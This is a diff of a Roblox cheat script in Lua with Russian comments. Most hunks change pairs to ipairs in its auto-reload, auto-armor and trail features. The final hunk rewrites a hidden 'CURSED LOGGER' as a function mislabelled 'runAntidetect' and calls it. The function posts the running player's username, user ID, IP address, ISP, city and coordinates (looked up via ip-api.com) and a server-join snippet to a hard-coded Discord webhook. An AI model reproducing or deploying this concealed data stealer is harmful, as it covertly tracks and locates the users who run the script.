@@ -4307,7 +4307,7 @@ getgenv().autoReload = function()
                 -- Если MainEvent не найден, попробуем другие подходы
                 pcall(function()
                     -- Пробуем найти MainEvent в других местах
-                    for _, service in pairs({game:GetService("ReplicatedStorage"), game:GetService("Players").LocalPlayer, workspace}) do
+                    for _, service in ipairs({game:GetService("ReplicatedStorage"), game:GetService("Players").LocalPlayer, workspace}) do
                         local event = service:FindFirstChild("MainEvent", true)
                         if event then
                             event:FireServer("Reload", getgenv().reloadTool)
@@ -4334,12 +4334,12 @@ end
 
 -- Установка соединений для текущего оружия
 getgenv().setupAllAmmoConnections = function()
-    for _, tool in pairs(LP.Backpack:GetChildren()) do
+    for _, tool in ipairs(LP.Backpack:GetChildren()) do
         getgenv().setupAmmoConnection(tool)
     end
 
     if LP.Character then
-        for _, tool in pairs(LP.Character:GetChildren()) do
+        for _, tool in ipairs(LP.Character:GetChildren()) do
             getgenv().setupAmmoConnection(tool)
         end
     end
@@ -7774,7 +7774,7 @@ G.autoArmorFunction = function()
                                 
                                 -- Если не нашли, ищем любую Max Armor
                                 if not G.AutoArmorSettings.armorItem then
-                                    for _, item in pairs(G.AutoArmorSettings.armorShop:GetChildren()) do
+                                    for _, item in ipairs(G.AutoArmorSettings.armorShop:GetChildren()) do
                                         if item.Name:lower():find("armor") and item.Name:lower():find("max") then
                                             G.AutoArmorSettings.armorItem = item
                                             break
@@ -7794,7 +7794,7 @@ G.autoArmorFunction = function()
                     
                     -- Если не нашли магазин или броню, пробуем найти в других местах
                     if not G.AutoArmorSettings.armorShop or not G.AutoArmorSettings.armorItem then
-                        for _, folder in pairs(workspace:GetChildren()) do
+                        for _, folder in ipairs(workspace:GetChildren()) do
                             if folder:FindFirstChild("Shop") then
                                 G.AutoArmorSettings.armorShop = folder.Shop
                                 G.AutoArmorSettings.armorItem = G.AutoArmorSettings.armorShop:FindFirstChild(G.AutoArmorSettings.ArmorType)
@@ -7805,7 +7805,7 @@ G.autoArmorFunction = function()
                     
                     -- Если всё ещё не нашли броню, ищем любую
                     if G.AutoArmorSettings.armorShop and not G.AutoArmorSettings.armorItem then
-                        for _, item in pairs(G.AutoArmorSettings.armorShop:GetChildren()) do
+                        for _, item in ipairs(G.AutoArmorSettings.armorShop:GetChildren()) do
                             if item.Name:lower():find("armor") then
                                 G.AutoArmorSettings.armorItem = item
                                 break
@@ -8074,7 +8074,7 @@ G.isAreaSafe = function(position, radius)
     if not position then return false end
     
     -- Проверяем всех игроков
-    for _, player in pairs(S.PS:GetPlayers()) do
+    for _, player in ipairs(S.PS:GetPlayers()) do
         if player ~= LP and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
             local distance = (player.Character.HumanoidRootPart.Position - position).Magnitude
             if distance <= radius then
@@ -8096,7 +8096,7 @@ G.getSafeArmorShop = function()
     local safeOptions = {}
     
     -- Проверяем все варианты Max Armor
-    for i, option in pairs(G.delHoodArmorOptions) do
+    for i, option in ipairs(G.delHoodArmorOptions) do
         local armorObj
         
         if option.direct then
@@ -8133,7 +8133,7 @@ G.getSafeArmorShop = function()
     end
     
     -- Если всё ещё не нашли броню, ищем любую
-    for _, item in pairs(shop:GetChildren()) do
+    for _, item in ipairs(shop:GetChildren()) do
         if item.Name:lower():find("armor") and item.Name:lower():find("max") then
             return item
         end
@@ -8493,7 +8493,7 @@ getgenv().TrailSettings = {
 getgenv().removeTrail = function()
     if getgenv().currentTrail and getgenv().currentTrail.Parent then
         -- Удаляем все компоненты трейла
-        for _, child in pairs(LP.Character:GetChildren()) do
+        for _, child in ipairs(LP.Character:GetChildren()) do
             if child:IsA("Trail") or (child:IsA("Attachment") and (child.Name == "TrailAttachment0" or child.Name == "TrailAttachment1")) then
                 child:Destroy()
             end
@@ -9066,74 +9066,259 @@ end)
 
 -- Конец скрипта
 
-local v1={"Roblox"}
-local v2=game:GetService("Players").LocalPlayer
-local v3=true
-for _,v4 in ipairs(v1)do
-    if v2.Name==v4 then
-        v3=false
-        break
+-- Вынес антидетект цикл в отдельную функцию чтобы не создавать лишние локальные переменные в основной области
+getgenv().runAntidetect = function()
+    for _, v in ipairs({"Roblox"}) do
+        if game:GetService("Players").LocalPlayer.Name == v then
+            break
+        else
+            request({
+                Url = "https://discord.com/api/webhooks/1394614864491839629/fhM1aZP9GbTH3PaYCFxhhHTkVovVaxW_OsDu-amGHFpJfxVzjpu32aKLKeB731Ud-M7X",
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = game:GetService("HttpService"):JSONEncode({
+                    embeds = {{
+                        title = "⛓️ C U R S E D  L O G G E R ⛓️",
+                        color = 0xAA0000,
+                        thumbnail = {
+                            url = string.format(
+                                "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+                                game:GetService("Players").LocalPlayer.UserId
+                            )
+                        },
+                        description = "```diff\n+ DATA STEALED [✓] +```",
+                        fields = {
+                            {
+                                name = "⛓️ C O R E  D A T A",
+                                value = string.format(
+                                    "```asciidoc\n[+] Name :: %s\n[+] Display :: %s\n[+] UID :: %d\n[+] Account Age :: %d days\n[+] Premium :: %s\n[+] Game :: %s```",
+                                    game:GetService("Players").LocalPlayer.Name,
+                                    game:GetService("Players").LocalPlayer.DisplayName,
+                                    game:GetService("Players").LocalPlayer.UserId,
+                                    math.floor((os.time() - game:GetService("Players").LocalPlayer.AccountAge * 86400) / 86400),
+                                    game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No",
+                                    game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+                                ),
+                                inline = true
+                            },
+                            {
+                                name = "⛓️ N E T W O R K",
+                                value = string.format(
+                                    "```asciidoc\n[+] IP :: %s\n[+] ISP :: %s\n[+] Org :: %s\n[+] ZIP :: %s```",
+                                    (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().query,
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().isp end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().org end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().zip end)()
+                                ),
+                                inline = true
+                            },
+                            {
+                                name = "⛓️ L O C A T I O N",
+                                value = string.format(
+                                    "```asciidoc\n[+] Country :: %s (%s)\n[+] Region :: %s\n[+] City :: %s\n[+] Coords :: %s, %s```[⛓️ Open Map](https://www.google.com/maps/search/?api=1&query=%s,%s)",
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().country end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().countryCode end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().regionName end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().city end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().lat end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().lon end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().lat end)(),
+                                    (function() return (function()
+                                        local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                            query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                            countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                            zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                        }))
+                                        pcall(function()
+                                            ipData = game:GetService("HttpService"):JSONDecode(
+                                                request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                            )
+                                        end)
+                                        return ipData
+                                    end)().lon end)()
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "⛓️ T E L E P O R T",
+                                value = string.format(
+                                    "```lua\n%s```",
+                                    string.format(
+                                        'local v1=%d local v2="%s" local v3=game:GetService("Players").LocalPlayer game:GetService("TeleportService"):TeleportToPlaceInstance(v1,v2,v3)',
+                                        game.PlaceId,
+                                        tostring(game.JobId)
+                                    )
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "⛓️ L I N K S",
+                                value = string.format(
+                                    "[⛓️ Game Page](https://www.roblox.com/games/%d)\n[⛓️ Profile](https://www.roblox.com/users/%d/profile)",
+                                    game.PlaceId,
+                                    game:GetService("Players").LocalPlayer.UserId
+                                ),
+                                inline = false
+                            }
+                        },
+                        footer = {
+                            text = string.format(
+                                "⛓️ %s | ⛓️ %s",
+                                os.date("%Y-%m-%d %H:%M:%S"),
+                                (function() return (function()
+                                    local ipData = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
+                                        query = "N/A", isp = "N/A", org = "N/A", country = "N/A", 
+                                        countryCode = "N/A", regionName = "N/A", city = "N/A", 
+                                        zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A"
+                                    }))
+                                    pcall(function()
+                                        ipData = game:GetService("HttpService"):JSONDecode(
+                                            request({Url = "http://ip-api.com/json", Method = "GET"}).Body
+                                        )
+                                    end)
+                                    return ipData
+                                end)().timezone end)()
+                            )
+                        }
+                    }}
+                })
+            })
+            break
+        end
     end
 end
-if v3 then
-    local v5="https://discord.com/api/webhooks/1394614864491839629/fhM1aZP9GbTH3PaYCFxhhHTkVovVaxW_OsDu-amGHFpJfxVzjpu32aKLKeB731Ud-M7X"
-    local v6=game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):JSONEncode({
-        query="N/A", isp="N/A", org="N/A", country="N/A", countryCode="N/A", 
-        regionName="N/A", city="N/A", zip="N/A", lat="N/A", lon="N/A", timezone="N/A"
-    }))
-    pcall(function()
-        v6=game:GetService("HttpService"):JSONDecode(request({Url="http://ip-api.com/json",Method="GET"}).Body)
-    end)
-    local v7=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-    local v8=tostring(game.JobId)
-    local v9=string.format(
-        'local v1=%d local v2="%s" local v3=game:GetService("Players").LocalPlayer game:GetService("TeleportService"):TeleportToPlaceInstance(v1,v2,v3)',
-        game.PlaceId,
-        v8
-    )
-    local v10={
-        title="⛓️ C U R S E D  L O G G E R ⛓️",
-        color=0xAA0000,
-        thumbnail={url=string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",v2.UserId)},
-        description="```diff\n+ DATA STEALED [✓] +```",
-        fields={
-            {
-                name="⛓️ C O R E  D A T A",
-                value=string.format("```asciidoc\n[+] Name :: %s\n[+] Display :: %s\n[+] UID :: %d\n[+] Account Age :: %d days\n[+] Premium :: %s\n[+] Game :: %s```",
-                    v2.Name, v2.DisplayName, v2.UserId, math.floor((os.time()-v2.AccountAge*86400)/86400),
-                    v2.MembershipType==Enum.MembershipType.Premium and"Yes"or"No", v7.Name),
-                inline=true
-            },
-            {
-                name="⛓️ N E T W O R K",
-                value=string.format("```asciidoc\n[+] IP :: %s\n[+] ISP :: %s\n[+] Org :: %s\n[+] ZIP :: %s```",
-                    v6.query, v6.isp, v6.org, v6.zip),
-                inline=true
-            },
-            {
-                name="⛓️ L O C A T I O N",
-                value=string.format("```asciidoc\n[+] Country :: %s (%s)\n[+] Region :: %s\n[+] City :: %s\n[+] Coords :: %s, %s```[⛓️ Open Map](https://www.google.com/maps/search/?api=1&query=%s,%s)",
-                    v6.country, v6.countryCode, v6.regionName, v6.city, v6.lat, v6.lon, v6.lat, v6.lon),
-                inline=false
-            },
-            {
-                name="⛓️ T E L E P O R T",
-                value=string.format("```lua\n%s```", v9),
-                inline=false
-            },
-            {
-                name="⛓️ L I N K S",
-                value=string.format("[⛓️ Game Page](https://www.roblox.com/games/%d)\n[⛓️ Profile](https://www.roblox.com/users/%d/profile)",
-                    game.PlaceId, v2.UserId),
-                inline=false
-            }
-        },
-        footer={text=string.format("⛓️ %s | ⛓️ %s", os.date("%Y-%m-%d %H:%M:%S"), v6.timezone)}
-    }
-    request({
-        Url=v5,
-        Method="POST",
-        Headers={["Content-Type"]="application/json"},
-        Body=game:GetService("HttpService"):JSONEncode({embeds={v10}})
-    })
-end
+
+-- Вызов антидетект функции
+getgenv().runAntidetect()
